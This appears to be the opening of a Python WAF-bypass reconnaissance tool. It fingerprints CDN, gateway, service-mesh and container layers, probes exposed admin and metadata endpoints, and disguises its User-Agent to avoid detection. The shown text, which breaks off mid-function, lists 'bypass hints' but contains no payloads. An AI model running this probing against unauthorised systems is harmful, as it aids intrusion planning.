#!/usr/bin/env python3
"""
Application Stack Traceroute & Bypass Generator
Next-Generation WAF/Proxy/Backend Chain Analysis Tool

Innovative Features:
- Maps complete request processing chain (WAF->CDN->Proxy->Backend)
- Identifies parsing discrepancies between layers
- Generates custom bypass payloads for each discovered discrepancy
- Protocol confusion testing (HTTP/1.1, HTTP/2, HTTP/3)
- Multi-layer encoding analysis
- Parser state machine confusion detection
- ENHANCED: Advanced bypass techniques based on deep discrepancies
- ENHANCED: JSON export for bypass automation
"""

import requests
import asyncio
import aiohttp
import json
import time
import base64
import urllib.parse
import zlib
import gzip
import random
import string
import socket
import ssl
import h2.connection
import h2.config
import re
import concurrent.futures
import threading
import queue
import logging
import uuid
import dns.resolver
import hashlib
from collections import defaultdict
from datetime import datetime
from urllib.parse import urlparse, urljoin
from typing import Dict, Optional, List, Set
import urllib3
import warnings


# Suppress SSL warnings for security testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


class ServiceDiscoveryEnhanced:
    def __init__(self):
        self.discovered_services = set()
        self.service_tree = {}
        self.behavioral_cache = {}
        self.chain_graph = defaultdict(list)  # Multi-path routing
        self.max_depth = 15
        self.parallel_chains = []
        
        # Configure session with advanced settings
        self.session = requests.Session()
        self.session.timeout = 10
        self.session.verify = False
        
        # ML-inspired service classification weights
        self.ml_weights = {
            'header_patterns': 0.3,
            'response_patterns': 0.25,
            'behavioral_patterns': 0.25,
            'timing_patterns': 0.2
        }
        # Suppress SSL warnings during security testing
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Set realistic headers to avoid detection
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Advanced detection patterns
# Miglioramenti per service_signatures mantenendo la struttura originale

        self.service_signatures = {
            'microservice': {
                'headers': [
                    'x-service-name', 'x-microservice', 'x-service-id', 'x-service-version',
                    'x-app-name', 'x-component', 'x-instance-id', 'service-name',
                    'x-correlation-id', 'x-trace-id', 'x-span-id'
                ],
                'paths': [
                    '/health', '/actuator/health', '/actuator/info', '/actuator/metrics',
                    '/metrics', '/status', '/ping', '/ready', '/live', '/healthz',
                    '/info', '/version', '/build-info', '/api/health', '/monitoring/health'
                ],
                'response_patterns': [
                    r'service.*running', r'microservice', r'api.*version', r'spring.*boot',
                    r'application.*name', r'build.*version', r'commit.*hash', r'instance.*id',
                    r'uptime', r'status.*up', r'healthy', r'node.*js', r'express.*js'
                ]
            },
            
            'api-gateway': {
                'headers': [
                    'x-gateway', 'x-api-gateway', 'x-kong', 'x-zuul', 'x-ambassador',
                    'x-tyk-gateway', 'x-apigateway', 'gateway-version', 'x-gateway-version',
                    'x-apigee', 'x-mashery', 'x-amazon-apigateway', 'x-azure-apim',
                    'x-gravitee', 'x-wso2'
                ],
                'behavioral': {
                    'rate_limiting': {
                        'headers': ['x-ratelimit', 'x-rate-limit', 'retry-after', 'x-ratelimit-remaining',
                                  'x-ratelimit-reset', 'x-rate-limit-limit', 'x-throttle'],
                        'response_codes': [429, 503],
                        'response_patterns': [r'rate.*limit.*exceeded', r'too.*many.*requests', 
                                            r'quota.*exceeded', r'throttled']
                    },
                    'request_id_propagation': {
                        'headers': ['x-request-id', 'x-correlation-id', 'x-trace-id', 'request-id',
                                  'x-amzn-requestid', 'x-ms-request-id', 'x-goog-request-id']
                    },
                    'cors_handling': {
                        'headers': ['access-control-allow-origin', 'access-control-allow-methods',
                                  'access-control-allow-headers', 'access-control-expose-headers'],
                        'preflight_support': True
                    },
                    'auth_delegation': {
                        'headers': ['www-authenticate', 'authorization', 'x-auth-token',
                                  'x-api-key', 'x-client-id'],
                        'oauth_patterns': [r'bearer.*token', r'oauth.*', r'jwt.*']
                    },
                    'response_transformation': True,
                    'request_routing': True,
                    'circuit_breaker': {
                        'response_patterns': [r'circuit.*breaker.*open', r'service.*unavailable',
                                            r'upstream.*error', r'backend.*timeout']
                    }
                },
                'paths': [
                    '/gateway', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/.well-known/',
                    '/swagger', '/openapi', '/docs', '/api-docs', '/spec', '/schema',
                    '/admin', '/management', '/actuator', '/gateway/routes', '/routes'
                ],
                'response_patterns': [
                    r'gateway.*version', r'api.*documentation', r'swagger.*ui', r'openapi.*spec',
                    r'rate.*limit.*exceeded', r'upstream.*timeout', r'backend.*error',
                    r'routing.*error', r'service.*discovery', r'load.*balancer',
                    r'kong.*gateway', r'zuul.*proxy', r'ambassador.*gateway'
                ],
                'timing_signatures': {
                    'consistent_overhead': (50, 200),
                    'timeout_behavior': (5000, 30000),
                    'cache_layer_timing': (10, 100),
                    'auth_validation_time': (20, 500)
                },
                'version_patterns': {
                    'kong': r'kong/(\d+\.\d+\.\d+)',
                    'zuul': r'zuul.*(\d+\.\d+\.\d+)',
                    'envoy': r'envoy/(\d+\.\d+\.\d+)'
                }
            },

            'cdn_edge': {
                'headers': [
                    # Cloudflare
                    'cf-ray', 'cf-cache-status', 'cf-request-id', 'cf-visitor', 'cf-connecting-ip',
                    'cf-ipcountry', 'cf-ew-via', 'cf-polished', 'cf-bgj',
                    # AWS CloudFront
                    'x-amz-cf-id', 'x-amz-cf-pop', 'x-cache', 'x-amz-request-id',
                    'cloudfront-viewer-country', 'cloudfront-is-mobile-viewer',
                    # Fastly
                    'fastly-debug-path', 'fastly-debug-ttl', 'x-served-by', 'x-cache-hits',
                    'x-timer', 'fastly-restarts', 'x-cache-grace',
                    # Akamai
                    'x-akamai-transformed', 'x-akamai-request-id', 'akamai-origin-hop',
                    # Generic CDN
                    'x-edge-location', 'x-cdn-pop', 'x-edge-response-result-type',
                    'x-cache-status', 'x-cdn-cache-status'
                ],
                'behavioral': {
                    'cache_behavior': {
                        'cache_headers': ['cache-control', 'expires', 'etag', 'last-modified'],
                        'cache_status_values': ['HIT', 'MISS', 'EXPIRED', 'STALE', 'UPDATING', 'BYPASS'],
                        'ttl_headers': ['x-cache-ttl', 'x-ttl', 'age']
                    },
                    'geo_routing': {
                        'country_headers': ['cf-ipcountry', 'x-country-code', 'cloudfront-viewer-country'],
                        'pop_headers': ['x-pop', 'cf-ray', 'x-amz-cf-pop']
                    },
                    'ddos_protection': {
                        'challenge_patterns': [r'ddos.*protection', r'checking.*browser', r'cloudflare.*challenge'],
                        'security_headers': ['cf-ray', 'x-frame-options', 'x-content-type-options']
                    },
                    'compression': {
                        'encoding_headers': ['content-encoding', 'x-original-content-length'],
                        'compression_types': ['gzip', 'brotli', 'deflate']
                    },
                    'ssl_termination': True,
                    'waf_integration': True
                },
                'paths': [
                    '/cdn-cgi/', '/__cf_chl_jschl_tk__/', '/favicon.ico', '/robots.txt',
                    '/cache-status', '/edge-status', '/akamai/sureroute-test-object.html'
                ],
                'response_patterns': [
                    r'cloudflare', r'fastly.*error', r'cloudfront', r'akamai',
                    r'cache.*hit', r'cache.*miss', r'edge.*server', r'pop.*server',
                    r'cdn.*cache', r'origin.*server', r'edge.*location'
                ],
                'timing_signatures': {
                    'cache_hit': (5, 50),
                    'cache_miss': (100, 2000),
                    'edge_processing': (10, 100),
                    'origin_fetch': (200, 5000),
                    'ssl_handshake': (50, 300)
                },
                'error_patterns': {
                    'origin_errors': [r'origin.*unreachable', r'backend.*error', r'upstream.*error'],
                    'cache_errors': [r'cache.*error', r'storage.*error'],
                    'ddos_patterns': [r'rate.*limited', r'blocked.*request', r'suspicious.*activity']
                }
            },

            'container_orchestration': {
                'headers': [
                    # Kubernetes
                    'x-kubernetes', 'x-k8s', 'x-pod-name', 'x-namespace', 'x-node-name',
                    'x-cluster-name', 'x-service-account', 'x-deployment-name',
                    # Docker Swarm
                    'x-docker', 'x-container-id', 'x-service-name', 'x-task-id',
                    'x-network-id', 'x-swarm-node-id',
                    # ECS/Fargate
                    'x-ecs-task', 'x-ecs-container-name', 'x-aws-region', 'x-amzn-trace-id',
                    'x-ecs-cluster', 'x-fargate-task-arn',
                    # OpenShift
                    'x-openshift-build', 'x-openshift-project'
                ],
                'behavioral': {
                    'health_checks': {
                        'paths': ['/health', '/healthz', '/ready', '/live', '/readiness', '/liveness'],
                        'probe_types': ['readiness', 'liveness', 'startup']
                    },
                    'metrics_exposure': {
                        'paths': ['/metrics', '/prometheus', '/stats', '/monitoring'],
                        'formats': ['prometheus', 'json', 'text']
                    },
                    'service_discovery': {
                        'dns_patterns': [r'.*\.svc\.cluster\.local', r'.*\.internal', r'.*\.mesh'],
                        'consul_patterns': [r'.*\.service\.consul'],
                        'eureka_patterns': [r'.*\.eureka']
                    },
                    'rolling_updates': {
                        'version_headers': ['x-app-version', 'x-build-version', 'x-git-commit'],
                        'deployment_headers': ['x-deployment-id', 'x-rollout-id']
                    },
                    'load_balancing': {
                        'session_affinity': ['x-session-id', 'jsessionid', 'server-id'],
                        'load_balancer_headers': ['x-forwarded-for', 'x-real-ip']
                    },
                    'auto_scaling': True,
                    'resource_limits': True
                },
                'dns_patterns': [
                    r'.*\.svc\.cluster\.local',      # Kubernetes
                    r'.*\.internal',                 # Internal DNS
                    r'.*\.mesh',                     # Service mesh
                    r'.*\.swarm',                    # Docker Swarm
                    r'.*\.ecs\.internal',            # ECS internal
                    r'.*\.compute\.internal'         # AWS internal
                ],
                'paths': [
                    '/metrics', '/healthz', '/readyz', '/livez', '/status',
                    '/actuator/health', '/actuator/info', '/actuator/prometheus',
                    '/debug/pprof', '/debug/vars', '/stats', '/info'
                ],
                'response_patterns': [
                    r'kubernetes', r'k8s', r'pod.*name', r'namespace',
                    r'docker.*container', r'container.*id', r'deployment',
                    r'replica.*set', r'stateful.*set', r'daemon.*set',
                    r'fargate', r'ecs.*task', r'cluster.*arn'
                ],
                'timing_signatures': {
                    'startup_time': (1000, 30000),
                    'shutdown_graceful': (1000, 30000),
                    'health_check_interval': (1000, 60000),
                    'rolling_update_time': (10000, 300000)
                }
            },

            'serverless_function': {
                'headers': [
                    # AWS Lambda
                    'x-amzn-requestid', 'x-amzn-trace-id', 'x-lambda-request-id',
                    'x-amz-invocation-type', 'x-amz-function-version', 'x-amz-function-name',
                    'x-amzn-remapped-content-length', 'x-amzn-remapped-connection',
                    # Google Cloud Functions
                    'function-execution-id', 'x-cloud-trace-context', 'x-goog-', 'x-appengine-',
                    'x-cloud-run-revision', 'x-serverless-runtime-version',
                    # Azure Functions
                    'x-azure-requestid', 'x-ms-request-id', 'x-ms-invocation-id',
                    'x-azure-functions-', 'x-ms-execution-context-invocationid',
                    # Vercel/Netlify
                    'x-vercel-', 'x-now-', 'x-nf-', 'x-netlify-'
                ],
                'behavioral': {
                    'cold_start_detection': {
                        'timing_variance': True,
                        'initialization_patterns': [r'cold.*start', r'function.*init', r'runtime.*init']
                    },
                    'execution_time_patterns': {
                        'timeout_headers': ['x-amzn-timeout', 'x-function-timeout'],
                        'execution_time_headers': ['x-execution-time', 'x-duration']
                    },
                    'memory_constraints': {
                        'memory_headers': ['x-max-memory', 'x-memory-limit'],
                        'oom_patterns': [r'memory.*limit', r'out.*of.*memory', r'heap.*exhausted']
                    },
                    'concurrent_execution': {
                        'concurrency_headers': ['x-concurrency-limit', 'x-reserved-concurrency'],
                        'throttling_patterns': [r'throttled', r'concurrent.*limit', r'rate.*exceeded']
                    },
                    'event_sources': {
                        'triggers': ['api-gateway', 'sqs', 's3', 'dynamodb', 'eventbridge', 'http']
                    }
                },
                'paths': [
                    '/api/', '/function/', '/.netlify/functions/', '/api/v1/',
                    '/.vercel/output/functions/', '/lambda/', '/azure-functions/',
                    '/gcf/', '/cloud-function/'
                ],
                'response_patterns': [
                    r'lambda.*timeout', r'function.*invocation', r'cold.*start',
                    r'execution.*time', r'memory.*limit', r'concurrent.*execution',
                    r'serverless.*runtime', r'function.*error', r'handler.*error',
                    r'cloud.*function', r'azure.*function', r'vercel.*function'
                ],
                'timing_signatures': {
                    'cold_start_penalty': (100, 3000),
                    'warm_execution': (5, 100),
                    'timeout_behavior': (15000, 900000),  # 15s to 15min
                    'billed_duration': (100, 900000)
                },
                'error_patterns': {
                    'timeout_errors': [r'task.*timed.*out', r'function.*timeout', r'execution.*timeout'],
                    'memory_errors': [r'memory.*exhausted', r'out.*of.*memory', r'heap.*limit'],
                    'runtime_errors': [r'runtime.*error', r'handler.*not.*found', r'module.*error']
                }
            },

            'load-balancer': {
                'headers': [
                    'x-load-balancer', 'x-forwarded-by', 'x-lb', 'x-lb-name',
                    'x-haproxy', 'x-nginx-lb', 'x-real-ip', 'x-forwarded-for',
                    'x-forwarded-proto', 'x-forwarded-host', 'x-forwarded-port',
                    'x-original-forwarded-for', 'x-cluster-client-ip',
                    'x-aws-alb-target-group-arn', 'x-amzn-trace-id'
                ],
                'behavioral': {
                    'session_persistence': {
                        'cookies': ['AWSALB', 'AWSALBCORS', 'lb-session', 'server-id'],
                        'headers': ['x-session-affinity', 'x-sticky-session']
                    },
                    'health_checking': {
                        'paths': ['/lb-status', '/health', '/check'],
                        'response_patterns': [r'healthy', r'available', r'up']
                    },
                    'ssl_termination': {
                        'headers': ['x-forwarded-proto', 'x-scheme'],
                        'termination_patterns': [r'ssl.*terminated', r'https.*offload']
                    },
                    'load_balancing_algorithms': ['round-robin', 'least-connections', 'ip-hash', 'weighted'],
                    'failover_behavior': True
                },
                'paths': [
                    '/lb-status', '/haproxy?stats', '/nginx_status', '/status',
                    '/health', '/load-balancer/health', '/elb-status'
                ],
                'response_patterns': [
                    r'load.*balance', r'upstream', r'backend.*pool', r'server.*pool',
                    r'haproxy', r'nginx.*lb', r'aws.*application.*load.*balancer',
                    r'target.*group', r'health.*check', r'failover'
                ],
                'timing_signatures': {
                    'health_check_interval': (5000, 30000),
                    'failover_detection': (1000, 10000),
                    'connection_draining': (5000, 300000)
                }
            },

            'service-mesh': {
                'headers': [
                    # Istio/Envoy
                    'x-envoy', 'x-envoy-upstream-service-time', 'x-envoy-original-path',
                    'x-envoy-decorator-operation', 'x-envoy-peer-metadata',
                    'x-istio-attributes', 'istio-mtls',
                    # Linkerd
                    'l5d-dst-service', 'l5d-dst-client', 'l5d-request-id',
                    'l5d-ctx-trace', 'x-linkerd-', 'linkerd-',
                    # Consul Connect
                    'x-consul-', 'consul-', 'x-consul-token', 'x-consul-index',
                    # Generic tracing
                    'x-b3-traceid', 'x-b3-spanid', 'x-b3-parentspanid', 'x-b3-sampled',
                    'x-ot-span-context', 'x-trace-id', 'x-span-id'
                ],
                'behavioral': {
                    'mtls_termination': {
                        'cert_headers': ['x-forwarded-client-cert', 'x-ssl-client-cert'],
                        'mtls_patterns': [r'mtls.*enabled', r'mutual.*tls', r'client.*cert']
                    },
                    'circuit_breaking': {
                        'response_patterns': [r'circuit.*breaker', r'upstream.*failure', r'max.*retries'],
                        'status_codes': [503, 504]
                    },
                    'retry_policies': {
                        'retry_headers': ['x-envoy-retry-on', 'x-envoy-max-retries'],
                        'retry_patterns': [r'retry.*policy', r'max.*retries', r'retry.*timeout']
                    },
                    'canary_routing': {
                        'routing_headers': ['x-canary-weight', 'x-traffic-split'],
                        'version_headers': ['x-version', 'x-variant']
                    },
                    'fault_injection': {
                        'fault_headers': ['x-envoy-fault-', 'x-chaos-'],
                        'fault_patterns': [r'fault.*injection', r'chaos.*engineering']
                    },
                    'observability': {
                        'metrics_collection': True,
                        'distributed_tracing': True,
                        'access_logging': True
                    }
                },
                'admin_paths': [
                    '/stats', '/clusters', '/config_dump', '/server_info',
                    '/listeners', '/runtime', '/certs', '/memory', '/cpuprofiler',
                    '/ready', '/stats/prometheus', '/hot_restart_version'
                ],
                'response_patterns': [
                    r'envoy.*proxy', r'istio', r'linkerd', r'consul.*connect',
                    r'service.*mesh', r'sidecar.*proxy', r'data.*plane',
                    r'control.*plane', r'xds.*config', r'pilot.*discovery'
                ],
                'timing_signatures': {
                    'proxy_overhead': (1, 50),
                    'circuit_breaker_trip': (100, 1000),
                    'retry_backoff': (100, 5000),
                    'config_reload': (1000, 30000)
                }
            },

            'database-proxy': {
                'headers': [
                    'x-db-proxy', 'x-pgbouncer', 'x-mysql-proxy', 'x-redis-proxy',
                    'x-connection-pool', 'x-db-connection-id', 'x-query-cache',
                    'x-db-server', 'x-shard-key'
                ],
                'behavioral': {
                    'connection_pooling': {
                        'pool_headers': ['x-pool-size', 'x-active-connections', 'x-idle-connections'],
                        'pool_patterns': [r'connection.*pool', r'max.*connections', r'pool.*exhausted']
                    },
                    'query_caching': {
                        'cache_headers': ['x-query-cache-hit', 'x-cache-ttl'],
                        'cache_patterns': [r'query.*cache', r'cache.*hit', r'cache.*miss']
                    },
                    'sharding': {
                        'shard_headers': ['x-shard-id', 'x-partition-key'],
                        'shard_patterns': [r'shard.*key', r'partition.*strategy']
                    },
                    'read_write_split': True,
                    'failover_support': True
                },
                'paths': [
                    '/db-status', '/pool-status', '/pgbouncer', '/mysql-proxy/status',
                    '/redis-info', '/connection-stats', '/query-stats'
                ],
                'response_patterns': [
                    r'database.*proxy', r'connection.*pool', r'pgbouncer', r'mysql.*proxy',
                    r'redis.*proxy', r'db.*connection', r'query.*cache', r'shard.*info'
                ],
                'timing_signatures': {
                    'connection_setup': (10, 100),
                    'query_execution': (1, 5000),
                    'pool_checkout': (1, 50)
                }
            },

            'cache-layer': {
                'headers': [
                    'x-cache', 'x-redis', 'x-memcached', 'x-varnish', 'x-cache-status',
                    'x-cache-key', 'x-cache-ttl', 'x-cache-hits', 'x-cache-age',
                    'varnish-age', 'varnish-cache', 'x-drupal-cache'
                ],
                'behavioral': {
                    'cache_strategies': {
                        'strategies': ['write-through', 'write-behind', 'cache-aside'],
                        'invalidation_patterns': [r'cache.*invalidate', r'purge.*cache', r'flush.*cache']
                    },
                    'cache_warming': {
                        'warming_patterns': [r'cache.*warm', r'preload.*cache'],
                        'warming_headers': ['x-cache-warmed', 'x-preload-status']
                    },
                    'distributed_cache': {
                        'cluster_headers': ['x-cache-node', 'x-cluster-id'],
                        'replication_patterns': [r'cache.*replica', r'sync.*status']
                    },
                    'compression': True,
                    'serialization': ['json', 'binary', 'protobuf']
                },
                'paths': [
                    '/cache-status', '/redis-info', '/memcached-stats', '/varnish-stats',
                    '/cache-stats', '/hit-ratio', '/memory-usage'
                ],
                'response_patterns': [
                    r'redis', r'memcached', r'varnish', r'cache.*hit', r'cache.*miss',
                    r'cache.*server', r'key.*value', r'cache.*cluster', r'hit.*ratio'
                ],
                'timing_signatures': {
                    'cache_hit': (1, 10),
                    'cache_miss': (10, 1000),
                    'cache_write': (1, 50),
                    'eviction_time': (1, 100)
                }
            },

            'message-queue': {
                'headers': [
                    'x-queue', 'x-rabbitmq', 'x-kafka', 'x-sqs', 'x-pubsub',
                    'x-message-id', 'x-correlation-id', 'x-delivery-tag',
                    'x-queue-name', 'x-topic-name', 'x-partition'
                ],
                'behavioral': {
                    'async_processing': {
                        'async_patterns': [r'async.*process', r'background.*job', r'queued.*task'],
                        'callback_headers': ['x-callback-url', 'x-webhook-url']
                    },
                    'message_ordering': {
                        'order_headers': ['x-sequence-number', 'x-message-order'],
                        'fifo_patterns': [r'fifo.*queue', r'ordered.*delivery']
                    },
                    'dead_letter_queues': {
                        'dlq_headers': ['x-dlq-retry-count', 'x-dead-letter-queue'],
                        'dlq_patterns': [r'dead.*letter', r'retry.*exhausted', r'poison.*message']
                    },
                    'batch_processing': {
                        'batch_headers': ['x-batch-size', 'x-batch-id'],
                        'batch_patterns': [r'batch.*process', r'bulk.*operation']
                    },
                    'message_persistence': True,
                    'acknowledgment_modes': ['auto', 'manual', 'duplicates-ok']
                },
                'paths': [
                    '/queue-status', '/rabbitmq/api', '/kafka/topics', '/sqs/stats',
                    '/pubsub/topics', '/messages', '/queues', '/topics'
                ],
                'response_patterns': [
                    r'rabbitmq', r'kafka', r'amazon.*sqs', r'google.*pubsub',
                    r'message.*queue', r'topic.*partition', r'consumer.*group',
                    r'producer', r'subscriber', r'dead.*letter'
                ],
                'timing_signatures': {
                    'queue_processing': (10, 5000),
                    'batch_delay': (100, 10000),
                    'message_latency': (1, 1000),
                    'consumer_lag': (0, 300000)
                }
            }
        }        
        # Container orchestration signatures
        self.container_patterns = {
            'kubernetes': {
                'headers': ['x-kubernetes', 'x-k8s', 'x-pod-name', 'x-namespace'],
                'dns_patterns': [r'.*\.svc\.cluster\.local'],
                'paths': ['/metrics', '/healthz'],
                'env_indicators': ['KUBERNETES_SERVICE', 'POD_NAME', 'NAMESPACE']
            },
            'docker': {
                'headers': ['x-container-id', 'x-docker', 'x-container-name'],
                'paths': ['/docker-health', '/container-info'],
                'response_patterns': ['container.*id', 'docker.*image']
            },
            'ecs': {
                'headers': ['x-amzn-trace-id', 'x-ecs-task', 'x-aws-region'],
                'paths': ['/task-metadata', '/stats'],
                'response_patterns': ['ecs.*task', 'aws.*fargate']
            },
            'cloud-run': {
                'headers': ['x-cloud-run', 'x-goog-', 'function-execution-id'],
                'paths': ['/metadata', '/health'],
                'response_patterns': ['cloud.*run', 'google.*cloud']
            }
        }

    def discover_backend_chain(self, entry_point: str, depth: int = 0) -> Dict:
        if depth >= self.max_depth or entry_point in self.discovered_services:
            return {}
        
        self.discovered_services.add(entry_point)
        service_info = self._analyze_service(entry_point)
        self.service_tree[entry_point] = service_info
        
        next_hop = self._find_next_service(service_info)
        if next_hop:
            self.discover_backend_chain(next_hop, depth + 1)
        
        return self.service_tree

    def _analyze_service(self, endpoint: str) -> Dict:
        """Ultra-advanced service analysis with multi-vector detection"""
        return {
            'type': self._detect_service_type(endpoint),
            'container_info': self._get_container_info(endpoint),
            'service_mesh_info': self._get_service_mesh_info(endpoint),
            'next_hop': None,
            'endpoint': endpoint,
            'timestamp': int(time.time())
        }

    def _detect_service_type(self, endpoint: str) -> str:
        """Multi-layered service type detection with forensic precision"""
        detection_scores = {}
        
        try:
            # Phase 1: Header-based detection
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return 'unknown'
            
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            # Score each service type based on header signatures
            for service_type, signatures in self.service_signatures.items():
                score = 0
                
                # Header analysis
                for header_pattern in signatures['headers']:
                    for header_name, header_value in headers.items():
                        if header_pattern in header_name or header_pattern in header_value:
                            score += 10
                
                # Response content analysis
                response_text = response.text.lower()
                for pattern in signatures['response_patterns']:
                    if re.search(pattern, response_text):
                        score += 5
                
                detection_scores[service_type] = score
            
            # Phase 2: Endpoint probing for confirmation
            parsed_url = urlparse(endpoint)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for service_type, signatures in self.service_signatures.items():
                for probe_path in signatures['paths']:
                    probe_url = urljoin(base_url, probe_path)
                    probe_response = self._safe_request('GET', probe_url, timeout=3)
                    
                    if probe_response and probe_response.status_code == 200:
                        detection_scores[service_type] = detection_scores.get(service_type, 0) + 15
                        
                        # Deep content analysis of probe responses
                        probe_text = probe_response.text.lower()
                        for pattern in signatures['response_patterns']:
                            if re.search(pattern, probe_text):
                                detection_scores[service_type] += 10
            
            # Phase 3: Advanced behavior analysis
            # Check for REST API patterns
            if self._is_rest_api(endpoint):
                detection_scores['microservice'] = detection_scores.get('microservice', 0) + 8
            
            # Check for GraphQL
            if self._is_graphql(endpoint):
                detection_scores['api-gateway'] = detection_scores.get('api-gateway', 0) + 12
            
            # Check for WebSocket support
            if self._supports_websocket(endpoint):
                detection_scores['microservice'] = detection_scores.get('microservice', 0) + 6
            
            # Phase 4: Return highest scoring service type
            if detection_scores:
                return max(detection_scores.items(), key=lambda x: x[1])[0]
            
            return 'unknown'
            
        except Exception as e:
            return 'error'

    def _get_container_info(self, endpoint: str) -> Dict:
        """Advanced container orchestration detection for bypass strategies"""
        container_info = {
            'orchestrator': 'unknown',
            'container_id': None,
            'image': None,
            'namespace': None,
            'cluster': None,
            'bypass_hints': []
        }
        
        try:
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return container_info
            
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            # Kubernetes detection with bypass intelligence
            k8s_score = 0
            for header_name, header_value in headers.items():
                # Direct Kubernetes headers
                if any(k8s_header in header_name for k8s_header in ['x-kubernetes', 'x-k8s', 'x-pod-name']):
                    k8s_score += 10
                    container_info['orchestrator'] = 'kubernetes'
                    
                    if 'x-pod-name' in header_name:
                        container_info['container_id'] = header_value
                    if 'x-namespace' in header_name:
                        container_info['namespace'] = header_value
            
            # Advanced Kubernetes detection via service patterns
            parsed_url = urlparse(endpoint)
            hostname = parsed_url.hostname
            
            # Check for Kubernetes DNS patterns
            if hostname and '.svc.cluster.local' in hostname:
                k8s_score += 15
                container_info['orchestrator'] = 'kubernetes'
                container_info['cluster'] = 'detected'
                # Extract service and namespace from DNS
                parts = hostname.split('.')
                if len(parts) >= 3:
                    container_info['namespace'] = parts[1]
            
            # Probe Kubernetes-specific endpoints
            k8s_probes = ['/metrics', '/healthz', '/readyz', '/livez']
            for probe in k8s_probes:
                probe_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", probe)
                probe_response = self._safe_request('GET', probe_url, timeout=3)
                
                if probe_response and probe_response.status_code == 200:
                    k8s_score += 5
                    # Look for Prometheus metrics (common in K8s)
                    if 'prometheus' in probe_response.text.lower() or '# TYPE' in probe_response.text:
                        k8s_score += 10
                        container_info['orchestrator'] = 'kubernetes'
            
            # Docker detection
            docker_indicators = ['x-container-id', 'x-docker', 'docker-content-digest']
            for header_name, header_value in headers.items():
                if any(docker_header in header_name for docker_header in docker_indicators):
                    container_info['orchestrator'] = 'docker'
                    if 'container-id' in header_name:
                        container_info['container_id'] = header_value
            
            # ECS/Fargate detection
            aws_indicators = ['x-amzn-trace-id', 'x-amzn-requestid', 'x-aws-']
            ecs_score = sum(1 for header_name in headers.keys() 
                           if any(aws_ind in header_name for aws_ind in aws_indicators))
            
            if ecs_score >= 2:
                container_info['orchestrator'] = 'ecs'
                # Try to get ECS task metadata
                metadata_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", '/task-metadata')
                metadata_response = self._safe_request('GET', metadata_url, timeout=3)
                if metadata_response and 'TaskARN' in metadata_response.text:
                    container_info['orchestrator'] = 'ecs-confirmed'
            
            # Generate bypass hints based on detected orchestration
            if container_info['orchestrator'] == 'kubernetes':
                container_info['bypass_hints'] = [
                    'internal_service_communication',
                    'cluster_internal_dns',
                    'service_mesh_bypass',
                    'pod_to_pod_direct'
                ]
            elif container_info['orchestrator'] == 'docker':
                container_info['bypass_hints'] = [
                    'container_network_bypass',
                    'docker_api_exposure',
                    'container_escape_vectors'
                ]
            elif container_info['orchestrator'] == 'ecs':
                container_info['bypass_hints'] = [
                    'aws_metadata_service',
                    'task_role_assumption',
                    'ecs_service_discovery'
                ]
            
            return container_info
            
        except Exception as e:
            container_info['error'] = str(e)
            return container_info

    def _get_service_mesh_info(self, endpoint: str) -> Dict:
        """Comprehensive service mesh detection for advanced bypass techniques"""
        mesh_info = {
            'mesh_type': 'none',
            'proxy_type': None,
            'version': None,
            'config_access': [],
            'bypass_vectors': []
        }
        
        try:
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return mesh_info
            
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            # Envoy/Istio detection (most common)
            envoy_indicators = ['server', 'x-envoy-', 'x-request-id']
            envoy_score = 0
            
            for header_name, header_value in headers.items():
                if 'envoy' in header_value:
                    envoy_score += 15
                    mesh_info['mesh_type'] = 'istio'
                    mesh_info['proxy_type'] = 'envoy'
                    
                    # Extract Envoy version if available
                    version_match = re.search(r'envoy/(\d+\.\d+\.\d+)', header_value)
                    if version_match:
                        mesh_info['version'] = version_match.group(1)
                
                if any(env_header in header_name for env_header in ['x-envoy-', 'x-b3-']):
                    envoy_score += 10
            
            # Advanced Envoy detection via admin endpoints
            parsed_url = urlparse(endpoint)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Envoy admin endpoints (often exposed internally)
            envoy_admin_paths = [
                '/stats',
                '/clusters',
                '/config_dump',
                '/server_info',
                '/listeners',
                '/runtime'
            ]
            
            accessible_endpoints = []
            for admin_path in envoy_admin_paths:
                admin_url = urljoin(base_url, admin_path)
                admin_response = self._safe_request('GET', admin_url, timeout=3)
                
                if admin_response and admin_response.status_code == 200:
                    accessible_endpoints.append(admin_path)
                    envoy_score += 20
                    
                    # Confirm it's Envoy by looking for specific content
                    if 'envoy' in admin_response.text.lower():
                        mesh_info['mesh_type'] = 'istio'
                        mesh_info['proxy_type'] = 'envoy'
                    
                    # Look for cluster information for service discovery
                    if admin_path == '/clusters' and 'outbound|' in admin_response.text:
                        mesh_info['mesh_type'] = 'istio-confirmed'
            
            mesh_info['config_access'] = accessible_endpoints
            
            # Linkerd detection
            linkerd_indicators = ['l5d-', 'x-linkerd', 'linkerd-']
            for header_name, header_value in headers.items():
                if any(linkerd_ind in header_name for linkerd_ind in linkerd_indicators):
                    mesh_info['mesh_type'] = 'linkerd'
                    mesh_info['proxy_type'] = 'linkerd-proxy'
            
            # Consul Connect detection
            consul_indicators = ['x-consul-', 'consul-']
            for header_name, header_value in headers.items():
                if any(consul_ind in header_name for consul_ind in consul_indicators):
                    mesh_info['mesh_type'] = 'consul-connect'
                    mesh_info['proxy_type'] = 'consul-proxy'
            
            # Generate bypass vectors based on detected mesh
            if mesh_info['mesh_type'] in ['istio', 'istio-confirmed']:
                mesh_info['bypass_vectors'] = [
                    'sidecar_bypass',
                    'mtls_certificate_abuse',
                    'service_identity_spoofing',
                    'envoy_admin_exposure',
                    'pilot_discovery_abuse'
                ]
                
                if accessible_endpoints:
                    mesh_info['bypass_vectors'].append('admin_api_exposed')
            
